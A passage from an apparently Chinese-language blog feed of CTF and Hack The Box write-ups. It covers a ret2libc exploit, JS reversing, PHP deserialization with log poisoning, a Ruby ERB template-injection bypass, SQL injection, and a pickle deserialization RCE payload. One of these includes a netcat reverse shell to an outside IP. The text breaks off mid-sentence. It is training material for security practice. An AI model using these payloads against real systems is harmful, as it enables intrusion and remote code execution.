class=\"line\">libc_base = puts_addr - libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">sys_addr = libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">bin_sh = libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>))</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">28</span>+<span class=\"number\">4</span>) + p32(ret_addr) +p32(sys_addr) +p32(<span class=\"number\">0xdeadbeef</span>) +p32(bin_sh)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive() </span><br></pre></td></tr></table></figure></p>\n<h4 id=\"i-have-the-flag\"><a class=\"anchor\" href=\"#i-have-the-flag\">#</a> I have the Flag</h4>\n<p>下载下来后一个 html 一个 js</p>\n<p><img data-src=\"/pic/clip_image002.jpg\" alt=\"\" /></p>\n<p>输一个 Something 正确就可以得到 flag</p>\n<p><img data-src=\"G:%5Cblog%5Csource_posts%5Cgjswp-md%5Cclip_image004.jpg\" alt=\"img\" /></p>\n<p>查看 js 发现 Something 就是 Token，Token 经过了三次加密</p>\n<p><img data-src=\"/pic/clip_image006.jpg\" alt=\"\" /></p>\n<p>分析 ck (s) 函数：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function ck(s) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  try &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​    ic</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125; catch (e) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​    return;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  var a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54];</span><br><span class=\"line\"></span><br><span class=\"line\">  if (s.length == a.length) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​    for (i = 0; i &lt; s.length; i++) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​      if (a[i] - s.charCodeAt(i) != 3)</span><br><span class=\"line\"></span><br><span class=\"line\">​        return ic = false;</span><br><span class=\"line\"></span><br><span class=\"line\">​    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">​    return ic = true;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  return ic = false;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>就是把输入的字符串的字符的 ASCII 码和 a [] 数组中的数逐个比较，一旦出现不是相差 3 的字符就返回<br />\n return ic = false;<br />\n 所有的字符和数字都相差 3 时就返回<br />\n return ic = true;<br />\n 我们根据代码逻辑，写出逆向求输入字符串的代码：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54];</span><br><span class=\"line\"></span><br><span class=\"line\">var s=&quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">for (i = 0; i &lt; a.length; i++) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​    s += String.fromCharCode(a[i] - 3);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>控制台运行</p>\n<p><img data-src=\"/pic/clip_image008.jpg\" alt=\"\" /></p>\n<h6 id=\"数独\"><a class=\"anchor\" href=\"#数独\">#</a> 数独</h6>\n<p>数独我做不来，就想到了拼接图片</p>\n<p><img data-src=\"/pic/clip_image010.jpg\" alt=\"\" /></p>\n<p>使用命令 gaps --image=image.png --generations=55 --population=9 --size=70 把 flag 拼好就可以了，感觉是一个非预期解</p>\n<p><img data-src=\"/pic/clip_image012.png\" alt=\"\" /></p>\n<p 4e4d6c332d6fe62a63afee56171fd3725=\"\">flag</p>\n",
            "tags": []
        },
        {
            "id": "https://lookhui.github.io/HTB-WEB-md/",
            "url": "https://lookhui.github.io/HTB-WEB-md/",
            "title": "HTB-WEB",
            "date_published": "2023-12-13T00:49:46.000Z",
            "content_html": "<h3 id=\"lovetok\"><a class=\"anchor\" href=\"#lovetok\">#</a> LoveTok</h3>\n<p>查看这个主页这个代码调用了另外一个地方的代码 timecontroller 先以 get 请求进去之后在使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class TimeController</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public function index($router)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] :&#x27;r&#x27;;</span><br><span class=\"line\">        $time = new TimeModel($format);</span><br><span class=\"line\">        return $router-&gt;view(&#x27;index&#x27;, [&#x27;time&#x27; =&gt; $time-&gt;getTime()]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个 timecontroller 的代码有了一个 get 请求并且直接将这个 get 请求的内容 format 放进 timemodlqu 进行调用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class TimeModel</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public function __construct($format)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;format = addslashes($format);</span><br><span class=\"line\"></span><br><span class=\"line\">        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];</span><br><span class=\"line\">        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function getTime()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;);</span><br><span class=\"line\">        return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>上面这个代码主要是查看到了一个 eval 代码可以判断为漏洞点，刚刚调用的是 timemode1 的方法并且这个里面的 gettime 方法里面还调用了 format 刚好触发 eval 来直接执行命令，相当于触发了 ${system (ls)} 漏洞也就是说 ssti 漏洞被触发</p>\n<h3 id=\"toxic\"><a class=\"anchor\" href=\"#toxic\">#</a> Toxic</h3>\n<p>白盒测试，首先看源代码，发现</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">spl_autoload_register(function ($name)&#123;</span><br><span class=\"line\">    if (preg_match(&#x27;/Model$/&#x27;, $name))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $name = &quot;models/$&#123;name&#125;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    include_once &quot;$&#123;name&#125;.php&quot;;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">if (empty($_COOKIE[&#x27;PHPSESSID&#x27;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $page = new PageModel;</span><br><span class=\"line\">    $page-&gt;file = &#x27;/www/index.html&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    setcookie(</span><br><span class=\"line\">        &#x27;PHPSESSID&#x27;, </span><br><span class=\"line\">        base64_encode(serialize($page)), </span><br><span class=\"line\">        time()+60*60*24, </span><br><span class=\"line\">        &#x27;/&#x27;</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">$cookie = base64_decode($_COOKIE[&#x27;PHPSESSID&#x27;]);</span><br><span class=\"line\">unserialize($cookie);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>这里使用的是一个反序列化代码并且 new pageMode1</p>\n<p>我们去看这个 pageMode1</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class PageModel</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $file;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct() </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        include($this-&gt;file);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>发现这个编码使用的是一个__destruct () 来进行包含查看源码，index.php 里面还给了 file 进行了定义值，并且 cookie 处来设定，并且只是使用了一个 base64 来进行加密，我们去访问网站把 cookie copy 一下进行解码</p>\n<p><img data-src=\"/pic/image-20231208154207149.png\" alt=\"\" /></p>\n<p>这里可以发现这个我们可以利用文件包含来查看任意内容，但是查看 entrypoint.sh 发现初始化时把 flag 给更改为 flag_加 5 个随机字符</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/ash</span><br><span class=\"line\"></span><br><span class=\"line\"># Secure entrypoint</span><br><span class=\"line\">chmod 600 /entrypoint.sh</span><br><span class=\"line\"></span><br><span class=\"line\"># Generate random flag filename</span><br><span class=\"line\">mv /flag /flag_`cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1`</span><br><span class=\"line\"></span><br><span class=\"line\">exec &quot;$@&quot;</span><br></pre></td></tr></table></figure></p>\n<p>现在可以想到的方法有去爆破他的 5 位随机字符代码如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import base64</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">random=str(os.system(&quot;cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1&quot;))</span><br><span class=\"line\">print(random)</span><br><span class=\"line\">url=&#x27;http://159.65.20.166:31290/&#x27;</span><br><span class=\"line\">php=&#x27;O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:60:&quot;php://filter/read=convert.base64-encode/resource=/flag_&#x27;+random+&#x27;&quot;;&#125;&#x27;</span><br><span class=\"line\">print(1)</span><br><span class=\"line\">cookie=base64.b64encode(php.encode())</span><br><span class=\"line\">header=&#123;</span><br><span class=\"line\">    &quot;Cookie&quot;:f&quot;PHPSESSID=&#123;cookie&#125;&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">pro=requests.get(url,headers=header,timeout=0.5)</span><br><span class=\"line\">print(cookie)</span><br><span class=\"line\">print(len(pro.text))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>爆破的话不太实际需要的时间太久，我们可以使用日志包含 php 然后通过访问访问达到文件包含来利用这个漏洞，因为访问页面时我们的浏览器表头 user-agent 和访问路径会被记录到日志上那可以使用如：</p>\n<ol>\n<li>首先使用 hackbar 来修改 header 的 user-agent:&lt;?php system ('ls /'); ?&gt;</li>\n<li>使用 hackbar 修改 header 的 Cookie 的 phpsessid 来等于 O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;} 进行 base 加密就能得到 flag 命名</li>\n<li>把 &lt;?php system ('cat /flag_1de1w'); ?&gt; 可以或者更改 cookie 也行</li>\n</ol>\n<h3 id=\"neonify\"><a class=\"anchor\" href=\"#neonify\">#</a> Neonify</h3>\n<p>这个 ruby 我第一次玩，白盒测试打开主代码 index.erb</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Neonify&lt;/title&gt;</span><br><span class=\"line\">    &lt;link rel=&quot;stylesheet&quot; href=&quot;stylesheets/style.css&quot;&gt;</span><br><span class=\"line\">    &lt;link rel=&quot;icon&quot; type=&quot;image/gif&quot; href=&quot;/images/gem.gif&quot;&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;div class=&quot;wrapper&quot;&gt;</span><br><span class=\"line\">        &lt;h1 class=&quot;title&quot;&gt;Amazing Neonify Generator&lt;/h1&gt;</span><br><span class=\"line\">        &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">            &lt;p&gt;Enter Text to Neonify&lt;/p&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;input type=&quot;text&quot; name=&quot;neon&quot; value=&quot;&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class=\"line\">        &lt;/form&gt;</span><br><span class=\"line\">        &lt;h1 class=&quot;glow&quot;&gt;&lt;%= @neon %&gt;&lt;/h1&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>里面的 &lt;%=@neon%&gt; 可以初步分析判断为 ssti 注入，然后再看 neon.rb</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class NeonControllers &lt; Sinatra::Base</span><br><span class=\"line\"></span><br><span class=\"line\">  configure do</span><br><span class=\"line\">    set :views, &quot;app/views&quot;</span><br><span class=\"line\">    set :public_dir, &quot;public&quot;</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">  get &#x27;/&#x27; do</span><br><span class=\"line\">    @neon = &quot;Glow With The Flow&quot;</span><br><span class=\"line\">    erb :&#x27;index&#x27;</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">  post &#x27;/&#x27; do</span><br><span class=\"line\">    if params[:neon] =~ /^[0-9a-z ]+$/i</span><br><span class=\"line\">      @neon = ERB.new(params[:neon]).result(binding)</span><br><span class=\"line\">    else</span><br><span class=\"line\">      @neon = &quot;Malicious Input Detected&quot;</span><br><span class=\"line\">    end</span><br><span class=\"line\">    erb :&#x27;index&#x27;</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure></p>\n<p>里面有一个分别为 get 和 post，如果你使用 post 方法的话会进行正则匹配是否为数字和字母如果不是直接等于</p>\n<p>Malicious Input Detected</p>\n<p>如果是的情况下就会在输出一下这个变量，查资料得到这个正则匹配可以通过匹配 %0a 来达到绕过手段也就是说使用 \\n 就能绕过和 php 一样，那么直接在 index.erb 里面输入 1%0a&lt;/h1&gt;&lt;%25=open ('|cat f*').read ()%25&gt;&lt;h1 &gt; 这样就能达到任意命令执行的效果</p>\n<p><img data-src=\"/pic/image-20231208163006608.png\" alt=\"image-20231208163006608\" /></p>\n<p>使用 &lt;%= File.open ('flag.txt').read %&gt; 也能得到 flag 但是需要进行 urlencode</p>\n<h3 id=\"cop\"><a class=\"anchor\" href=\"#cop\">#</a> C.O.P</h3>\n<p>这个代码是 python 写的打开后能发现这个代码 models.py 里面的代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class shop(object):</span><br><span class=\"line\"></span><br><span class=\"line\">    @staticmethod</span><br><span class=\"line\">    def select_by_id(product_id):</span><br><span class=\"line\">        return query_db(f&quot;SELECT data FROM products WHERE id=&#x27;&#123;product_id&#125;&#x27;&quot;, one=True)</span><br></pre></td></tr></table></figure></p>\n<p>还有 database.py 里面的代码如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import g</span><br><span class=\"line\">from application import app</span><br><span class=\"line\">from sqlite3 import dbapi2 as sqlite3</span><br><span class=\"line\">import base64, pickle</span><br><span class=\"line\"></span><br><span class=\"line\">def connect_db():</span><br><span class=\"line\">    return sqlite3.connect(&#x27;cop.db&#x27;, isolation_level=None)</span><br><span class=\"line\">    </span><br><span class=\"line\">def get_db():</span><br><span class=\"line\">    db = getattr(g, &#x27;_database&#x27;, None)</span><br><span class=\"line\">    if db is None:</span><br><span class=\"line\">        db = g._database = connect_db()</span><br><span class=\"line\">        db.row_factory = sqlite3.Row</span><br><span class=\"line\">    return db</span><br><span class=\"line\"></span><br><span class=\"line\">def query_db(query, args=(), one=False):</span><br><span class=\"line\">    with app.app.app_context():</span><br><span class=\"line\">        cur = get_db().execute(query, args)</span><br><span class=\"line\">        rv = [dict((cur.description[idx][0], value) \\</span><br><span class=\"line\">            for idx, value in enumerate(row)) for row in cur.fetchall()]</span><br><span class=\"line\">        return (next(iter(rv[0].values())) if rv else None) if one else rv</span><br><span class=\"line\"></span><br><span class=\"line\">class Item:</span><br><span class=\"line\">\tdef __init__(self, name, description, price, image):</span><br><span class=\"line\">\t\tself.name = name</span><br><span class=\"line\">\t\tself.description = description</span><br><span class=\"line\">\t\tself.image = image</span><br><span class=\"line\">\t\tself.price = price</span><br><span class=\"line\"></span><br><span class=\"line\">def migrate_db():</span><br><span class=\"line\">    items = [</span><br><span class=\"line\">        Item(&#x27;Pickle Shirt&#x27;, &#x27;Get our new pickle shirt!&#x27;, &#x27;23&#x27;, &#x27;/static/images/pickle_shirt.jpg&#x27;),</span><br><span class=\"line\">        Item(&#x27;Pickle Shirt 2&#x27;, &#x27;Get our (second) new pickle shirt!&#x27;, &#x27;27&#x27;, &#x27;/static/images/pickle_shirt2.jpg&#x27;),</span><br><span class=\"line\">        Item(&#x27;Dill Pickle Jar&#x27;, &#x27;Literally just a pickle&#x27;, &#x27;1337&#x27;, &#x27;/static/images/pickle.jpg&#x27;),</span><br><span class=\"line\">        Item(&#x27;Branston Pickle&#x27;, &#x27;Does this even fit on our store?!?!&#x27;, &#x27;7.30&#x27;, &#x27;/static/images/branston_pickle.jpg&#x27;)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    </span><br><span class=\"line\">    with open(&#x27;schema.sql&#x27;, mode=&#x27;r&#x27;) as f:</span><br><span class=\"line\">        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)</span><br><span class=\"line\">        get_db().cursor().executescript(f.read().format(*list(shop)))</span><br></pre></td></tr></table></figure></p>\n<p>这个 sql 语句能直接产生 sql 注入，还有就是这个 pickle (泡菜) 看到 pickle 我们就能想到 python 的反序列化</p>\n<p>先去页面注入尝试一下</p>\n<p><img data-src=\"/pic/image-20231210134014962.png\" alt=\"image-20231210134014962\" /></p>\n<p>发现</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;order by 1--+不报错</span><br><span class=\"line\">1&#x27;order by 2--+直接报错</span><br></pre></td></tr></table></figure></p>\n<p>那直接使用 sqlmap 跑一次试试，发现使用的是 SQLite 数据库，那么我们就无法直接进行读取文件了，因为 sqlite 无法直接 --os-shell，这些表里也没有其他内容，那么进攻点就还有 pickle 了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)</span><br></pre></td></tr></table></figure></p>\n<p>按照这个思路的话可以构造执行 shell 命令拼接 sql 语句，无效化前面的商品，利用 union select 能够直接将反序列化的代码传入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import base64</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#x27;cp flag.txt application/static/.&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">class RCE:</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return os.system, (payload,)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    print(base64.b64encode(pickle.dumps(RCE())))</span><br></pre></td></tr></table></figure></p>\n<p>需要注意的点是这段代码需要使用 linux 运行，因为 windows 运行的 base64 编码后和 linux 的不一样</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">windows:gASVOAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br><span class=\"line\">linux:gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br></pre></td></tr></table></figure></p>\n<p>然后利用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; union select &#x27;gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br><span class=\"line\">或者&#x27; union select &#x27;gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg== &#x27;--+</span><br></pre></td></tr></table></figure></p>\n<p>在访问 /static/flag.txt 即可得到 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import base64</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#x27;nc 172.25.36.114 8888 -e /bin/bash&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">class RCE:</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return os.system, (payload,)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode(&#x27;ascii&#x27;))</span><br></pre></td></tr></table></figure></p>\n<p>在使用相同的办法直接进行反弹 